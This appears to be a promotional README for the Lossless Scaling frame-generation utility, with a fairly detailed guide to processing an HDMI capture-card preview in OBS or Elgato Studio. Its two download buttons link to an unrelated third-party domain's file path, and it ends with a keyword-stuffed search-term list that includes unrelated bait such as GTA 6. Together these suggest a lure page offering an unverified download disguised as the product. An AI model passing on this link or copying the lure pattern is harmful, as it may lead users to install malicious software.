# Interpolate an HDMI capture preview with Lossless Scaling

[![Download](https://img.shields.io/badge/Download-Lossless%20Scaling-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)

## Fast HDMI Preview Testing Brief

What is Lossless Scaling? A Windows utility that can generate intermediate frames for a compatible capture preview.  
Why use it for HDMI Preview Testing? It lets you compare a processed PC view with the card's unprocessed feed and HDMI passthrough.  
Who needs it? Console capture-card users who want to evaluate a smoother local view without changing their recording workflow.  
Does it support adding frames to the OBS recording automatically? No, targeting the preview window alone does not alter the capture source or recording settings.  

## HDMI Preview Testing Overview

Keep three outputs separate: HDMI passthrough to the play display, the Windows preview, and the file saved by the capture program. Lossless Scaling can process the second of those if it can capture the window. It cannot change what the card sends over HDMI Out, and OBS does not inherit the generated frames when it records its original capture source.

Start with a single console source in OBS or one active device in Elgato Studio. A supported 1080p SDR mode makes it easier to see whether a failure is related to capture timing rather than HDR or variable refresh. Confirm the cadence of distinct images before choosing Fixed x2: a 60 Hz HDMI signal may carry repeated pictures from 30 fps gameplay, and doubling that preview is not necessarily a 30-to-60 test.

The utility is one component, the capture app another, and the card a third. Consult reports that name the card and distinguish the time spent in capture, preview and processing. If you mainly want immediate controller feedback, play from the passthrough display and leave the PC view unprocessed.

## Lossless Scaling Capability Matrix

| Function | Role in workflow |
|---|---|
| OBS projector targeting | Processes an isolated source window rather than the mixer or entire editor. |
| Elgato window targeting | Uses the live view whose movement matches the selected card input. |
| Fixed x2 preview | Adds in-between images when the captured preview supplies an even 30 fps input. |
| Separate presentation | Leaves the capture card's HDMI Out path outside the Windows processing chain. |
| Scaling off | Keeps the first test centered on timing instead of changes to preview size. |
| Capture method selection | Provides an alternative when a healthy source window does not appear in the processed view. |
| Performance model | Offers a lighter test if preview processing competes with OBS rendering. |
| Preview profile | Stores the settings for this local monitoring task apart from browser or network profiles. |

Check recording settings and playback even if the monitor shows smoother motion. An OBS file tagged at 60 fps can still contain repeated frames, so single-step the test recording through a moving shot before drawing conclusions.

## Getting Started Playbook

Install Lossless Scaling and either OBS Studio or Elgato Studio as separate programs. Feed the console into the card's **HDMI In**, connect **HDMI Out** to a play display if the card supports passthrough, and connect the card to the PC as specified by its maker. In OBS, add **Video Capture Device**, pick the card from **Device**, confirm motion and sound, then open a **Windowed Projector (Source)** for that source. In Elgato Studio, verify the model in the top-left device menu and click the resolution and frame-rate readout to inspect **Input source** and **Capture device** before leaving the preview in a window.

Confirm the target by moving through a console menu and watching which PC window follows it, then use **Scale** and focus that window, not the controls or recording library. If the captured preview really delivers steady 30 fps, test **Fixed x2** with scaling off at 60 Hz and compare response with the HDMI passthrough display. In OBS, use **Start Recording** and record a short moving shot with the original card source while the processor is active. Open the file after stopping the recording, check sound, and step through the moving section to see what OBS actually saved.

## Everyday Use

Keep one capture app in charge of the card while troubleshooting device access. There is no console sign-in step for the HDMI cable; the utility runs as a separate local component. Treat preview features as local monitoring choices and check OBS **View → Stats** for rendering or encoding lag if processing and recording run together.

## Practical Scenarios

Scenario A - Xbox Series X card source: Confirm the Xbox dashboard moves in the OBS source projector before applying interpolation.  
Scenario B - Elgato preview selection: Match the device menu to the physical card and check the readout before focusing its live window.  
Scenario C - Different play displays: Run the same controller movement on HDMI passthrough and the processed PC preview before deciding where to play.  
Scenario D - Clean recording test: Keep the card as the scene source and inspect a saved clip independently of what the processed monitor showed.  

## System Requirements

| Item | Minimum | Recommended |
|---|---|---|
| OS | 64-bit Windows 10 version 2004 or later for the utility; the capture app may require Windows 11 | Windows 11 24H2 or a newer supported build for the chosen card and capture program |
| CPU | 64-bit processor meeting the capture program and card requirements | Enough capacity for capture and a local test recording without dropped work |
| RAM | Use the capture stack's requirement; no utility-specific figure is published | Practical: 16 GB as a starting point for preview and recording together |
| Storage | Space for both programs and a short test clip | SSD sized for the intended recording duration and bitrate |
| Graphics | DirectX 11-capable modern integrated graphics is the floor; the capture stack can require more | RTX 30, Radeon RX 6000 or Intel Arc; leave headroom for rendering and encoding |
| Other | Supported capture card, compatible HDMI signal and a correctly rated USB port or PCIe slot | Separate passthrough monitor if available, plus a PC display set to match the preview test |

## Download Lossless Scaling

Open the download page and take the Windows build for your machine. Confirm the package type, then start the capture app you use.

[![Download](https://img.shields.io/badge/Download-Lossless%20Scaling-2ecc71?style=for-the-badge&logo=download&logoColor=white)](https://shanxisaide.com/s/file)

## Troubleshooting Common Issues

Install issues? If the card isn't listed, check its USB connection or driver with the capture program before installing anything again.  
Performance problems? Make a recording with the processor off and compare OBS rendering or encoding lag before reducing preview size.  
Edition differences? The utility's install state is separate from the console account; one does not unlock the other.  
Compatibility? A black raw preview points to signal or device access, while a black processed view with a healthy raw preview points to window targeting or capture API.  
Update failures? After a capture app or driver change, re-establish the raw feed and reopen the intended preview before testing interpolation again.  

## Related Search Terms

Lossless Scaling, Lossless Scaling software, Lossless Scaling download, Lossless Scaling features, Lossless Scaling Windows app, Lossless Scaling reviews, Lossless Scaling app, Lossless Scaling alternatives, Lossless Scaling for Windows, Lossless Scaling latest version, Lossless Scaling HDMI preview, Lossless Scaling OBS projector, Lossless Scaling Elgato Studio, HDMI passthrough versus capture preview, Xbox Series X OBS card source, LSFG Fixed x2 HDMI capture, 30 fps preview cadence, OBS recording frame repeats, Elgato capture device readout, OBS rendering lag with frame generation, gta 6 hdr performance, gta 6 capture card commentary
